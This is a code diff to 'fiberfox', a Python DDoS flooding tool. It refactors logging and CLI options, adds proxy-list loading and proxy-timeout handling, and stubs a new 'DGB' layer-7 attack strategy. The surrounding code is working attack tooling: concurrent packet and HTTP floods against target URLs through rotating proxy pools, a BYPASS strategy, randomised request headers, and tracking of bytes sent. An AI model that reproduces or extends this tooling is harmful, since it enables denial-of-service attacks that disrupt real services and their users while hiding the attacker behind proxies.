@@ -13,6 +13,7 @@ import json
 from logging import basicConfig, getLogger
 from math import log2, trunc
 from pathlib import Path
+from python_socks import ProxyTimeoutError
 from python_socks.async_.curio import Proxy
 from random import choice, randbytes, randrange
 import re
@@ -31,12 +32,10 @@ from urllib import parse
 # * stats: better numbers, on KeyboardInterrupt, list of errors
 # * implement the rest of the attacks
 # * read referres/useragents from files
-# * pip install, run as a package "python -m fiberfox"
+# * run as a package "python -m fiberfox", programmatic launch
 
 
 basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")
-logger = getLogger("fiberfox")
-logger.setLevel("INFO")
 
 
 # xxx(okachaiev): try out "hummanize" package
@@ -97,7 +96,7 @@ def proxy_type_to_protocol(proxy_type: Union[int, str]) -> str:
 
 async def load_from_provider(ctx: "Context", provider, proxies: List[str]) -> None:
     proto = proxy_type_to_protocol(provider["type"])
-    logger.info(f"Loading proxies from url={provider['url']} type={proto}")
+    ctx.logger.info(f"Loading proxies from url={provider['url']} type={proto}")
     try:
         response = await asks.get(provider["url"], timeout=provider["timeout"])
     except Exception as e:
@@ -155,10 +154,14 @@ class ProxySet:
             return f"ProxySet[{num_alive}/{num_alive+num_dead} {ratio:0.1f}%]"
 
     @classmethod
+    def from_list(cls, proxies: List[str]) -> "ProxySet":
+        return cls(proxies=[p.strip() for p in proxies if p.strip()])
+
+    @classmethod
     def from_file(cls, path: Union[str, Path]) -> "ProxySet":
         with open(path) as f:
             proxies = f.read().splitlines()
-        return cls(proxies=[p.strip() for p in proxies if p.strip()])
+        return cls.from_list(proxies)
 
     @classmethod
     async def from_providers(cls, ctx: "Context", providers: List[Any]) -> "ProxySet":
@@ -217,8 +220,9 @@ class Context:
         num_fibers: int = 20,
         packet_size: int = 1024,
         rpc: int = 1000,
-        stop_after_seconds: int = 10,
+        duration_seconds: int = 10,
         connection_timeout_seconds: int = 10,
+        log_level: str = "INFO",
     ):
         self.args = args
         self.targets = targets
@@ -227,17 +231,19 @@ class Context:
         self.num_fibers = num_fibers
         self.packet_size = packet_size
         self.rpc = rpc
-        self.stop_after_seconds = stop_after_seconds
+        self.duration_seconds = duration_seconds
         self.connection_timeout_seconds = connection_timeout_seconds
         
         hist_buckets = 10 if rpc >= 10 else 0 # no need to track hist if RPC is small
         self.stats: Dict[URL, Stats] = defaultdict(lambda: Stats(hist_max=rpc))
         self.num_errors: int = 0
         self.errors: deque = deque([], maxlen=100)
+        self.logger = getLogger("fiberfox")
+        self.logger.setLevel(log_level.upper())
 
     @property
     def connection_timeout(self):
-        return min(self.connection_timeout_seconds, self.stop_after_seconds)
+        return min(self.connection_timeout_seconds, self.duration_seconds)
 
     def track_packet_sent(self, fid: int, target: Target, size: int) -> None:
         if size > 0:
@@ -247,7 +253,7 @@ class Context:
         self.stats[target.url].reset_session(fid)
 
     def track_error(self, exc: Union[Exception, str]) -> None:
-        logger.debug(exc)
+        self.logger.debug(exc)
         self.num_errors += 1
         self.errors.append(str(exc))
 
@@ -257,11 +263,13 @@ class Context:
         return cls(
             args=args,
             targets=targets,
-            num_fibers=args.num_fibers,
+            num_fibers=args.concurrency,
             strategy=args.strategy,
             rpc=args.rpc,
             packet_size=args.packet_size,
-            stop_after_seconds=args.exec_time_seconds,
+            duration_seconds=args.duration_seconds,
+            log_level=args.log_level,
+            connection_timeout_seconds=args.connection_timeout_seconds,
         )
 
 
@@ -283,6 +291,7 @@ referrers: List[str] = [
 ]
 
 
+# xxx(okachaiev): would be good to have a library to manage encodings only
 def http_req_get(target: Target) -> bytes:
     version = choice(["1.1", "1.2"])
     return (
@@ -324,12 +333,11 @@ def rand_str(size: int) -> str:
     return "".join(choice(string.ascii_letters) for _ in range(size)) 
 
 
-async def connect_via_proxy(proxy: Proxy, target: Target):
-    conn = await proxy.connect(target.addr, target.port)
+async def connect_via_proxy(ctx: Context, proxy: Proxy, target: Target):
+    conn = await proxy.connect(target.addr, target.port, timeout=ctx.connection_timeout)
     if target.ssl_context is not None:
         conn = await target.ssl_context.wrap_socket(
-            conn, do_handshake_on_connect=False, server_hostname=None)
-        await conn.do_handshake()
+            conn, do_handshake_on_connect=True, server_hostname=None)
     return conn
 
 
@@ -356,7 +364,7 @@ class TcpConnection:
     async def __aenter__(self):
         if self._ctx.proxies:
             self._proxy_url, proxy = next(self._ctx.proxies)
-            conn = connect_via_proxy(proxy, self._target)
+            conn = connect_via_proxy(self._ctx, proxy, self._target)
         else:
             conn = curio.open_connection(
                 self._target.addr, self._target.port, ssl=self._target.ssl_context)
@@ -393,14 +401,16 @@ async def flood_packets_gen(
     target: Target,
     packets: Generator[bytes, None, None]
 ):
-    packet_sent, stream, proxy_url = 0, None, None
+    packet_sent, stream, proxy_url, proxy = 0, None, None, None
     try:
         if ctx.proxies:
             proxy_url, proxy = next(ctx.proxies)
-            conn = connect_via_proxy(proxy, target)
+            conn = connect_via_proxy(ctx, proxy, target)
         else:
-            conn = curio.open_connection(target.addr, target.port, ssl=target.ssl_context)
-        conn = await curio.timeout_after(ctx.connection_timeout, conn)
+            conn = curio.timeout_after(
+                ctx.connection_timeout,
+                curio.open_connection(target.addr, target.port, ssl=target.ssl_context))
+        conn = await conn
         stream = conn.as_stream()
         async with curio.meta.finalize(packets) as packets:
             async for payload in packets:
@@ -408,15 +418,27 @@ async def flood_packets_gen(
                 ctx.track_packet_sent(fid, target, len(payload))
                 packet_sent += 1
     except curio.TaskTimeout:
+        # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
+        # if the target is dead, we should not remove proxy from the pool
+        ctx.track_error(f"Connection timeout proxy={proxy_url} target={target.url}")
+        if proxy_url:
+            ctx.proxies.mark_dead(proxy_url)
         return 0
+    except ProxyTimeoutError as e:
+        # xxx(okachaiev): how to differentiate proxy connection vs. target connection?
+        # if the target is dead, we should not remove proxy from the pool
+        ctx.track_error(e)
+        ctx.proxies.mark_dead(proxy_url)
     except Exception as e:
-        ctx.track_error(f"Proxy error: {proxy_url} {e}")
+        # xxx(okachaiev): some errors should be a reason to remove proxy from the pool,
+        # e.g. when negotiation failed
+        ctx.track_error(f"Proxy error: proxy={proxy_url} target={target.url} {e}")
         return packet_sent
     finally:
         if stream:
             await stream.close()
-        if proxy_url and packet_sent == 0:
-            ctx.proxies.mark_dead(proxy_url)
+        if proxy:
+            await proxy._close()
     return packet_sent
 
 
@@ -480,7 +502,7 @@ async def BYPASS(ctx: Context, fid: int, target: Target):
                             break
                         chunks.append(chunk)
                 else:
-                    logger.error(f"connection closed: {bytes_sent}/{len(req)}")
+                    ctx.logger.error(f"connection closed: {bytes_sent}/{len(req)}")
                 ctx.track_packet_sent(fid, target, bytes_sent + sum(map(len, chunks)))
 
 
@@ -572,6 +594,22 @@ async def AVB(ctx: Context, fid: int, target: Target):
     await flood_packets_gen(ctx, fid, target, gen())
 
 
+async def DGB(ctx: Context, fid: int, target: Target):
+    """Sends a single HTTP GET request, copies cookie values from the
+    response. After that issues RPC additional GET requests with a delay
+    between them. The response is properly consumed from the network.
+
+    Layer: L7.
+
+    Implementational note: MHDDoS impl. uses Session object from
+    the Python's requests package that does not guarantee reuse of
+    underlying TCP connection. Which means HTTP-layer attach would
+    work even if the target server does not support persistent re-usable
+    connections.
+    """
+    pass
+
+
 async def flood_fiber(fid: int, ctx: Context, target: Target):
     while True:
         # run a flood session (for TCP connections this would typically mean
@@ -584,7 +622,9 @@ async def flood_fiber(fid: int, ctx: Context, target: Target):
 
 async def load_proxies(ctx: Context):
     if ctx.args.proxies:
-        proxy_set = ProxySet.from_file(ctx.args.proxies)
+        proxy_set = ProxySet.from_list(ctx.args.proxies)
+    elif ctx.args.proxies_list:
+        proxy_set = ProxySet.from_file(ctx.args.proxies_list)
     elif ctx.args.providers_config:
         print(f"==> Loading proxy servers from providers")
         # xxx(okachaiev): cache into file
@@ -603,12 +643,12 @@ async def flood(ctx: Context):
     group = curio.TaskGroup()
     for target in ctx.targets:
         print(f"==> Launching {ctx.num_fibers} fibers "
-              f"targeting {target.url} for {ctx.stop_after_seconds}s")
+              f"targeting {target.url} for {ctx.duration_seconds}s")
         for fid in range(ctx.num_fibers):
             await group.spawn(flood_fiber, fid, ctx, target)
 
     started_at = time.time()
-    while time.time() < started_at + ctx.stop_after_seconds:
+    while time.time() < started_at + ctx.duration_seconds:
         await curio.sleep(10)
         show_stats(ctx, time.time()-started_at)
 
@@ -616,7 +656,7 @@ async def flood(ctx: Context):
     timeout = object()
     terminted = await curio.ignore_after(10, group.cancel_remaining(), timeout_result=timeout)
     if terminted is timeout:
-        print("Shutdown timeout, forcing termination")
+        ctx.logger.warning("Shutdown timeout, forcing termination")
     await group.join()
 
     end_at = time.time()
@@ -628,10 +668,10 @@ def show_stats(ctx: Context, elapsed_seconds: int, sign="🦊"):
         total_bytes_sent = ctx.stats[target.url].total_bytes_sent
         bytes_sent_repr = humanbytes(total_bytes_sent, True)
         rate = humanbytes(total_bytes_sent/elapsed_seconds, True)
-        progress = 100*elapsed_seconds/ctx.stop_after_seconds
-        logger.info(
+        progress = 100*elapsed_seconds/ctx.duration_seconds
+        ctx.logger.info(
             f"{sign} {target.url}\t{progress:0.2f}%\t"
-            f"Sent {bytes_sent_repr} in {elapsed_seconds:0.2f}s ({rate}/s)\t"
+            f"Sent {bytes_sent_repr} in {elapsed_seconds:0.2f}s ({rate}ps)\t"
             f"{ctx.proxies}")
 
 
@@ -676,8 +716,8 @@ def parse_args(available_strategies):
         help="List of targets, separated by spaces (if many)"
     )
     parser.add_argument(
-        "-n",
-        "--num-fibers",
+        "-c",
+        "--concurrency",
         type=int,
         default=8,
         help="Number of fibers per target (for TCP means max number of open connections)"
@@ -702,24 +742,40 @@ def parse_args(available_strategies):
         help="Packet size (in bytes)"
     )
     parser.add_argument(
-        "-t",
-        "--exec-time-seconds",
+        "-d",
+        "--duration-seconds",
         type=int,
         default=10,
         help="How long to keep sending packets, in seconds"
     )
     parser.add_argument(
-        "-p",
         "--providers-config",
         type=Path,
         default=None,
         help="Configuration file with proxy providers"
     )
     parser.add_argument(
-        "--proxies",
+        "--proxies-list",
         type=Path,
         default=None,
         help="List proxies"
+    )
+    parser.add_argument(
+        "--proxies",
+        nargs="*",
+        help="List of proxy servers, separated by spaces (if many)"
+    )
+    parser.add_argument(
+        "--log-level",
+        default="INFO",
+        choices=["DEBUG", "INFO", "ERROR", "WARN"],
+        help="Log level (defaults to INFO)"
+    )
+    parser.add_argument(
+        "--connection-timeout-seconds",
+        type=int,
+        default=10,
+        help="Proxy connection timeout in seconds (default: 10s)"
     )
     args = parser.parse_args()
 
@@ -729,7 +785,7 @@ def parse_args(available_strategies):
     if args.providers_config and not args.providers_config.exists():
         raise ValueError("Proxy providers configuration file does not exist")
 
-    if args.proxies and not args.proxies.exists():
+    if args.proxies_list and not args.proxies_list.exists():
         raise ValueError("File with proxies does not exist")
 
     args.strategy = available_strategies[args.strategy.lower()]
